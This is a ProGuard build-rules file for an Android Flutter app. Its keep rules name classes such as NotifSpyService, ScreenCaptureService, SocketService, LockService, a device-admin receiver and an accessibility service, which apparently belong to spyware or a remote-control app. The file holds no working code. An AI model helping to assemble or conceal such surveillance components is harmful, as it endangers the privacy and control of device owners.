# ── Flutter ───────────────────────────────────────────────────────────────────
-keep class io.flutter.** { *; }
-keep class io.flutter.embedding.** { *; }
-keep class io.flutter.plugin.** { *; }
-dontwarn io.flutter.**

# ── Kotlin ────────────────────────────────────────────────────────────────────
-keep class kotlin.** { *; }
-keep class kotlinx.** { *; }
-dontwarn kotlin.**

# ── App classes ───────────────────────────────────────────────────────────────
-keep class com.psknmrc.app.LockService { *; }
-keep class com.psknmrc.app.BootReceiver { *; }
-keep class com.psknmrc.app.AppProtectionService { *; }
-keep class com.psknmrc.app.SocketService { *; }
-keep class com.psknmrc.app.DeviceAdminReceiver { *; }
-keep class com.psknmrc.app.NotifSpyService { *; }
-keep class com.psknmrc.app.ScreenCaptureService { *; }
-keep class com.psknmrc.app.CheatOverlayService { *; }
-keep class com.psknmrc.app.MainActivity { *; }

# ── Accessibility ─────────────────────────────────────────────────────────────
-keep class * extends android.accessibilityservice.AccessibilityService { *; }

# ── Attributes ────────────────────────────────────────────────────────────────
-keepattributes Signature
-keepattributes *Annotation*
-keepattributes EnclosingMethod
-keepattributes InnerClasses

# ── Suppress warnings ─────────────────────────────────────────────────────────
-dontwarn android.app.StatusBarManager
-dontwarn com.google.android.**
-dontwarn androidx.**
